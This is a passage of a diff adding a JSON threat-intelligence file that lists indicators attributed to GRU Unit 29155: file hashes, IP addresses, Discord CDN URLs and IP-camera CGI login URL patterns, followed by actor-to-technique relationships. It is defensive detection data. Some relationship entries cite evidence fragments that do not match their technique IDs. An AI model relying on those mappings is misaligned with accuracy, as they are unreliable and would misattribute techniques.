+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "0dd61a16c625c49ffefaf4ce24cabf9a074028a06640d9bbb804f735ff56dfa3",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "29d83f29c0b0a0b7499e71e7d5cb713f",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "fd4a5398e55beacb2315687a75af5aa15b776b5d36b9800a1792ede3955616c2",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "17fc12902f4769af3a9271eb4e2dacce",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "29ae7b30ed8394c509c561f6117ea671ec412da50d435099756bbb257fafb10b",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "3907c7fbd4148395284d8e6e3c1dba5d",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "34ca75a8c190f20b8a7596afeb255f2228cb2467bd210b2637965b61ac7ea907",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "d034fe4c71b16b6d331886c24fef2751",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "4074798a621232dc448b65db7b1fdd66",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "422437f326b8dbe30cc5f103bde31f26",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "7f84263fd24f783ff72d5ae91011b558",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "562c337b8caca330da2ea6ae07ee5db6",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "f73d203bdf924658fd6edf3444c93a50",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "58e879213d81333b628434ba4aeb2751",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "08dfebc04eb61c9a6d87b6524c1c0f2e",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "1c85c0d044ac837e8939564afac1eb32",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "8633bd2bbbb5da22c3f8751150186c42",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "7234da8ceafbe6586469f18c03cc1832",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "5f4df6dd8e644d59eaf182e500b5e7bf",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "618d62dd95fd9aeb855fe2ef1403dce5",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "955e4c198ee58e40fe92cb74ceefdf00",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "d40195a444526eafb0db56d95bf8655d",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "a905d620717f75751aa94ceb88995dbc",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "d06761b2cff86035a4838110ed6ab622",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "2ca6bcf16ee4293a771a1cf7b7b9ee49",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "59da31da4db1aa5f9a5c7c0c151422c8",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "de1bf141976776becd376a0dac400df6",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "de1f9d1f0336ddcff832ad3900acd2f1",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "974e7c0b3660fbf18f29eac059f85ac0",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "394e056cb6cb732dfd5e0d45d3dae938",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "4d8343c40be53d6521244fe74393d937",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "b7c1a8d39f46eaf52be90e24565dd6b0",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "7a70d5fbbafe3454b76e3ad2f009618f",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "2b39eab325906b0a3ab7e584c3d67349",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "df4f856f783d23fb01af1e0e64bc0e20",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "80f0ee332a452172533ad8863bb3bc63",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "f4f4e55a00d2f3a433c9e5624285ac1c",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "9345425cf07b4c39a80cd8540e08bfde",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "eef2363744345741e09fe5380eeb4df3",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "aecb57e20d2c0b0d9fece2cbcbcc3459",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "4bce4831b1dd71f19c55b3e3b5e99856",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "58dc7c9577ff90a046359ca255c0c9f4",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "19cb20c4e7dbfe15c1aa284752d0fecb",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "5c9e2195d10375b746b6717fdb47b5b9",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "2b5f159f022109a8de1bc5dd9e3138a0",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "afbb9459d4a0f60d7ffb3b3532d11bc2",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "8d3d4d702ba6b4be2766a41bfe5ff76e",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "a1b509254a0a1daa7e00d279ec974461",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "0e03103e8110785156105946e48ea9e0",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "791a81f31a8e7090a7d5417451e09efa",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "fba76f4eb2e7a2eb17193bebe290a198",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "e1a15bc13157134f542cd9c55c742460",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "c9d1677f4f89b95b41591b23a1dc1a63",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "cd62d4a178705b2b90a8babd8613df93",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "032f5642d4fb2fdd74e6f20a13c57746",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "f34f60375bebad861a35b7c4bb0fa1c8",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "a66b3b22a3619f739b197d0d443b700c",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "7fe7f33d9b5dbdf3d032d2a10e39f283",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "8cfef66b390f08bdbfd940922cf51650",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "b32e14a9b7de6c92cd16758fa6e23346",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "1220b580cef1bf22351e271773945d20",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "b85538f665fdb6c8d9a74f2df7369832",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "ffa68749aa3fc6495e2c49b01d964339",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "869742fb9db71fdb66f00528fe2966ec",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "5b884f15dc9b072d7bbad9ec2b249f38",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "2128361d8aaae1225d50c9add32006a1",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "9152c9de57b5647ee4ab3dff551dc8dd",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "56e0446a6d7175a0d09110bc483ddbed",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "fc418fdda06ce5982153766dcefb71d9",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "6a4fca88ee36fecc5113e188cc39d25c",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "5c3b0040e2dece6e17093ae607b79044",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "143594597130e301499e5940a5fb798a",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "911c7e82f32f78577dcd725a7adb114d",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "993f01861aff306df44e6475f7886f37",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "e4634ef9bfe7b598b857ad997445b239",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "64b9feeccf6c183b9f7138f8fc53acbb",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "7e0c42d33921a89724424f17c97037bd",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "ddec2d79f460a881849037336ba8968f",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "d973210977957209f255b58eb1715b12",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "9606b4720a0e73ef1f00505a11aab2f7",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "0adc2530cf348c0a3d53a680291a3d67",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "f772f5c65d65412f61ef5f2660e33ceb",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "f8ffd1eab6223e31b15d0fd6c3c0472e",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "875f9200b49db08c33962b0a6bd05ab9",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "2e035360971a817b854d7d5a2b008717",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "fa97dbe84ce7717b754795fa89f13dce",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "601c12596dfea84c2113ae5ee59a52ec",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "d8c04ecd646a1f8537a59f63518ef3c6",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "47f4534da421daf8089cf34d53f6bb6e",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "3bcff990faacbebb8fb470dfe03e2543",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "683546b9171a1ea284a96d1b45d1d823",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "c265188fdadddb648629e8060601dca7",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "af85885a74cfe099676af542dcdc5741",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "8a2ba7f9cb6f65edf65dbe579907551e",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "673586594242d99ab02118595e457297",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "9657c2ef6ed5229740b125df9ca6c915",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "0dc5ac12f7690db15c99eaabc11b129c",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "a5494ffd9efb7c3df59c527076a05e62",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "e2cc52273d56ed66c800a726760c1ed0",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "85afdef18d65b0518d709a5a324ea57a",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "77675a24040f10c85112d9a219d5f1c7",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "da4d81f9ef3b25ea09f34481d923dd9d",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "cc4a9db6f250114e26d8d9ba6ab46bc9",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "0e6374042b33d78329149a6189a7cb46",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "1934e2ebc64d41e37ef53ea0c075e974",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "d33f608f561096be24cba91797e0da2f",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "332b7f6662e28e3577bd1b269904b940",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "32db8abce1618e60441f5c7cf4be0d22",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "2b2509c6ee46d6327f2f1c9a75122d15",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "dd2431b1f858b4ca14a4ea05fb8c4a06",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "9b2924c727aa3a061906321a66c9050c",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "7d3b529db1bd896d9fd877b85cafdc64",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "de276cf07ccffa18d7ffc35281bca910",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "6e1394938c2fecad2d4f5b3bcf357ec0",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "d6b41747cb035c4c2b08790cd57f0626",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "99305ce01cc2d0f58cd226efb2de893f",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "6859fe5a3eead00a563cd93efcc6ea96",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "6c152774f6894407075e6f0a2859bbae",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "981160dee6cd25fb181e54eca7ff7c22",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "343b140977b3f9b227e7e5f82b0fadb5",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "95cf2a5a24b0d33d621bb8995d5826bc",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "54a9fa9eb337a3b5ca7b0fa4553e439d",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "cee5acbfef7e76f52f40b8ae95199c50",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "4c19aeecbfca13b8a199703d8b8284b9",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "ad0ca738aa6c987e4ee1a87ff2b8acd5",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "dc795cb9290b1bc0b7fb1ce9d6ae7c93",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "552d9b79cc544fc6c3e8aa204dd00811",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "9935a86108e3ae3f72cd15817601dcc6",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "5d063eecd894d3d523875bc82ef6f319",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "77aa3f342a0d69fda67c853bcc004d48",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "d0b00a6c83ce810ec2763af17e8ab1c4",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "03af632aa6f87bf9dd4364ee3b612cbb",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "9f11e915be5c0d02a3130329cf032a28",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "41871fef433d7b4b89fd226fe3a1a2c0",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "e21fe98cc8866c0eeecf3549ebcec751",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "246d9f9831b125ea7e6ef21bc4c8a0ca",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "dea3ae8225913dd98148fc86cfc3bcbe",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "9c695be3703194fdb71c212a0832bcf3",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "8744cec7547b1e73705c10a264e28e08",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "69e58c5ee69f5e5e8a58f4afdd59adfe",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "d43446b4a22a597b93b559821ee5ac9b",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "540ee8e39150c539fea582b0e77be7b0",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "3fe96ff4a5ef0f5346ce645a2a893597",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "0a2affa6d895baab087b84e93145da35",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "246f31c86bbbe7f65c0126cf4a1a947a",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "569c1d31f4c7ec7701d8e4e51b59fe85",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "5eaa7e812733a5c8cda734fab2f752d5",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "09a2d85e809d36bff82bd5ab773980a3",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "96964aed18f65a7acae632f358a093f6",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "3ccf799ff208981349cee4fb1a1cf88c",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "4e9c55c6fe25d61ca4394de794546fab",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "6154760e602bd71192d93f72fbdb486e",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "94bf96b76c2a092de8962496ce35deaf",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "b0d0a23766fa64ece9315f37b28bb4c0",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "1e22d64f263e8ea4b2d37dcd9b7c3012",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "ca43a241042b5fcc305393765ae18e69",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "28d571ddb5c04d065dfe1be9604663ba",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "251f3a4757d9e4de0499cc30c0bc00a9",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "755dac7edd17fbf5b5c449dd06c02e14",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "9d7ab8b0aa669125d9a5adc4f46c56f3",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "af277ae0fbf6cc20f887696ea4756d46",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "a9c9c0be8eca3b575c24da0fcf1af1a9",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "1cac5c0cb8801e8730447023270d8d56",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "url",
+   "value": "http://<IP>:<port>/PictureCatch.cgi?username=<NAME>&password=",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "url",
+   "value": "http://<IP>:<port>/ssi.cgi/tmp/Login.htm",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "domain-name",
+   "value": "mega.nz",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "url",
+   "value": "https://cdn.discordapp.com/attachments/928503440139771947/9301086376811847",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "url",
+   "value": "https://cdn.discordapp.com/attachments/888408190625128461/8956339522477998",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "url",
+   "value": "https://cdn.discordapp.com/attachments/945968593030496269/9459704461495091",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "url",
+   "value": "http://cdn.discordapp.com/attachments/",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "url",
+   "value": "https://cdn.discordapp.com/attachments/928503440139771947/930108637681184768",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "5.226.139.66",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "45.141.87.11",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "46.101.242.222",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "62.173.140.223",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "79.124.8.66",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "90.131.156.107",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "112.51.253.153",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "112.132.218.45",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "154.21.20.82",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "179.43.133.202",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "179.43.142.42",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "179.43.162.55",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "179.43.175.38",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "179.43.175.108",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "179.43.176.60",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "179.43.187.47",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "179.43.189.218",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "185.245.84.227",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "185.245.85.251",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "194.26.29.84",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "194.26.29.95",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "194.26.29.98",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "194.26.29.251",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "domain-name",
+   "value": "interlinks.top",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "url",
+   "value": "https://3proxy.ru",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "url",
+   "value": "https://ngrok.com",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "url",
+   "value": "https://nssm.cc",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "81.17.24.130",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "111.111.111.111",
+   "indicates": [
+    "Unit 29155"
+   ]
+  }
+ ],
+ "relationships": [
+  {
+   "source": "GRU Unit 29155",
+   "type": "uses",
+   "target": "WhisperGate",
+   "evidence": "GRU Unit 29155 cyber actors began deploying the destructive WhisperGate malware against multiple Ukrainian victim organizations as early as January 13, 2022."
+  },
+  {
+   "source": "GRU Unit 29155",
+   "type": "uses",
+   "target": "Data Destruction",
+   "evidence": "the destruction of data [T1485]."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1595.001",
+   "evidence": "Unit 29155 cyber actors have been observed targeting IP ranges [T1595.001] used within multiple government and critical infrastructure organizations"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1595.002",
+   "evidence": "Unit 29155 cyber actors leveraged both Acunetix and Nmap to identify open ports, services, and vulnerabilities for networks [T1595.002]"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1595.001",
+   "evidence": "s [T1595.001] used within multiple"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1595",
+   "evidence": "government and critical infrastructure organizations. The following are publicly available tools these cyber"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1590.002",
+   "evidence": "actors have used for scanning [T1595] and vulnerability exploit efforts. Unit 29155 cyber actors were not"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1596.005",
+   "evidence": "observed using these tools outside of their intended purpose. Note: Use of these tools should not be"
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
+   "target": "T1046",
+   "evidence": "attributed as malicious without analytical evidence to support threat actor use and/or control."
+  },
+  {
+   "source": "Unit 29155",
+   "type": "uses",
